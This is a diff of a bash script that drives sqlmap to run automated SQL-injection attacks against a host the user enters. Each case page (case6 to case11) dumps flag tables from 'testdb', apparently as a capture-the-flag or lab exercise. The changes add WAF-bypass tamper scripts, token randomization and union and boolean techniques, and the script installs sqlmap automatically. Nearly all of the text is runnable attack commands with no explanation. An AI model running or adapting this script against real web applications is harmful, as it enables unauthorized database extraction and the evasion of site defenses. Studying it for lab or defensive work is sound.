@@ -72,30 +72,32 @@
 #	OUTFILE=" | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG"
 
 	# Get target info from user
-	echo -e "Enter Target host, with port :, without protocol: "
+	echo "Enter Target host, with port :, without protocol: "
 	read UINHOST
-	echo -e "Enter Protocol (http or https) "
+	echo "Enter Protocol (http or https) "
 	read UINPROTO
 	TGTHOST="$UINPROTO://$UINHOST"
 	TGTHOST="$TGTHOST"
 	echo -e "Target host set to" $TGTHOST
 
 	# check if sqlmap is installed
-	echo -e "Checking if SQLmap is installed"
+	echo -e "" && echo -e "Checking if SQLmap is installed"
 
 	if [ $(dpkg-query -W -f='${Status}' sqlmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
 	then
 	  echo -e "SQLmap not installed, trying to install now" && apt-get install sqlmap -y;
+	else
+	  echo -e "sqlmap is installed!"
 	fi
 
-	# check if paths exists
+#	# check if paths exists
 #	if [ -d "$OUTLOG" ];
 #	then
 #	  (echo 'path: '$OUTLOG' exists');
 #	  else (touch $OUTLOG && echo -e "making directory: " $OUTLOG);
 #	fi
 
-	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '$TGTHOST
+	SQMIN='sqlmap --batch --dump -D testdb --random-agent -u '$TGTHOST
 	echo -e "SQMIN = " $SQMIN
 
 	#main commands
@@ -119,27 +121,34 @@
 	echo -e 'running case 5: ' $CS5
 	$CS5 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS6="$SQLMIN/case6.php?col=id -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix='\`)'"
+	CS6="$SQMIN/case6.php?col=id -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix='\`)'"
 	echo -e 'running case 6: ' $CS6
 	$CS6 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS7="$SQLMIN/case7.php -T flag7"
+	CS7="$SQMIN/case7.php -T flag7"
 	echo -e 'running case 7: ' $CS7
 	$CS7 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS8="$SQLMIN/case8.php -T flag8"
+# needs testing
+
+# get tokens and parse
+#	curl -v "http://$UINHOST/case8.php" -c cookies.txt -o curlout.txt && cat curlout.txt | grep -E "<form method='.+name='(.+)'"
+#	TOLKIN=
+# debug token grab
+# echo -e 'Token value: ' $TOLKIN
+	CS8="$SQMIN/case8.php? -T flag8 --data 'id=1&t0ken=$TOLKIN' --randomize=t0ken --method=POST --skip-waf --tamper=between,randomcase"
 	echo -e 'running case 8: ' $CS8
 	$CS8 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS9="$SQLMIN/case9.php -T flag9"
+	CS9="$SQMIN/case9.php?id=1&uid=4209312674 -T flag9 --data 'id=1&uid=1234567890' --randomize=uid --method=GET --skip-waf --tamper=between,randomcase"
 	echo -e 'running case 9: ' $CS9
 	$CS9 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS10="$SQLMIN/case10.php -T flag10"
+	CS10="$SQMIN/case10.php?id=1 -T flag10 --method=POST --skip-waf --data='id=1' --technique=U"
 	echo -e 'running case 10: ' $CS10
 	$CS10 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS11="$SQLMIN/case11.php -T flag11"
+	CS11="$SQMIN/case11.php -T flag11 --method=GET --skip-waf --tamper=between -technique=B -dbms=mysql"
 	echo -e 'running case 11: ' $CS11
 	$CS11 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 	sleep 10
